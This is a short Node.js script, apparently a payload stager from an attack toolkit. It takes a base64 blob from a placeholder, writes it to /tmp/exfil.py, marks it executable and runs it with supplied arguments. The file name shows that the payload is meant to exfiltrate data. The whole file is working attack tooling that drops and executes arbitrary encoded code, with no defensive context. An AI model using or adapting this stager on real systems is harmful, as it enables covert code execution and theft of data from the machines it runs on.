var data = '_FILE'
var args = 'ARGS'

if (args === 'A'+'R'+'G'+'S') { 
    args = '';
}
else {
    args = ' ' + args;
}

var filename = "/tmp/exfil.py";
require('fs').writeFileSync(filename, (Buffer.from(data, 'base64')).toString('ascii'));
require('fs').chmodSync(filename, "755");
require('child_process').exec(filename + args, function(error, stdout, stderr) { console.log(stdout) });
